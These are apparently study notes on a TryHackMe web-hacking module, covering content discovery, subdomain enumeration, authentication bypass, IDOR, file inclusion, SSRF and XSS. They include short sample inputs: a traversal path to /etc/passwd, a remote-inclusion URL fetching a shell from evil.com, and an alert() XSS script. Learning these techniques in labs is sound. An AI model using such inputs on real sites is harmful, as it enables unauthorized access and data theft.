# Introduction to Web Hacking

> 🌐 [TryHackMe: Introduction to Web Hacking](https://tryhackme.com/path)

This module introduces essential web application hacking techniques by simulating real-world vulnerabilities — all within a safe and legal lab environment. It’s focused on **manual analysis, practical exploitation**, and understanding **why** these bugs matter.

---

## 🧭 Key Learning Areas

This module covers the **top web vulnerabilities** every ethical hacker or penetration tester must know.

---

## 🕵️ Walking an Application (Manual Testing)

### 🔍 Focus:
- Learn to inspect pages using **only the browser's developer tools**
- Understand the structure and behavior of modern web apps

### ✍️ Notes:
- Developer Tools (F12) can expose hidden fields, JavaScript logic, and request/response structures.
- You can manipulate forms, cookies, headers, and more directly from the browser.

---

## 🔎 Content Discovery

### 🔍 Focus:
- Discover hidden or unlinked files/folders on a web server

### 🛠 Tools & Techniques:
- Manual guessing (`robots.txt`, `.git/`, `/admin`)
- **Directory brute-forcing** using tools like `gobuster`, `dirb`, or `ffuf`

---

## 🌐 Subdomain Enumeration

### 🔍 Focus:
- Discover subdomains that might host vulnerable services

### 🛠 Tools:
- `dnsrecon`, `sublist3r`, `Amass`, and online platforms like crt.sh
- Wordlist-based brute forcing with `wfuzz` or `ffuf`

---

## 🔓 Authentication Bypass

### 🔍 Focus:
- Exploit broken login mechanisms to gain unauthorized access

### 🧪 Techniques:
- SQL injection in login forms
- Default credentials
- Session/cookie tampering
- Logic flaws (e.g., login succeeds if password field is blank)

---

## 🆔 IDOR (Insecure Direct Object Reference)

### 🔍 Focus:
- Access data by modifying input like user IDs in URLs or form data

### 🧪 Example:
- Change `user_id=103` to `user_id=102` to view another user's data

🧠 Tip: Always inspect URLs, cookies, and request parameters for predictable patterns.

---

## 📂 File Inclusion

### 🔍 Focus:
- Exploit file inclusion flaws to read sensitive files or execute remote code

### Types:
- **LFI (Local File Inclusion)**: e.g., `page=../../etc/passwd`
- **RFI (Remote File Inclusion)**: e.g., `page=http://evil.com/shell.txt`

### 🧱 Mitigation:
- Whitelisting files, sanitizing input, disabling dangerous functions

---

## 🛰️ Intro to SSRF (Server-Side Request Forgery)

### 🔍 Focus:
- Force the server to send requests on your behalf

### 🧪 Use Cases:
- Access internal services (e.g., `http://localhost:8080`)
- Bypass firewalls
- Exfiltrate data using out-of-band techniques

---

## 🧪 Intro to Cross-site Scripting (XSS)

### 🔍 Focus:
- Inject malicious JavaScript into web pages viewed by other users

### Types:
- **Reflected XSS**: Script in the URL
- **Stored XSS**: Script saved in a database
- **DOM-based XSS**: Exploiting client-side JavaScript

🛠 Payload example:
```html
<script>alert('XSS')</script>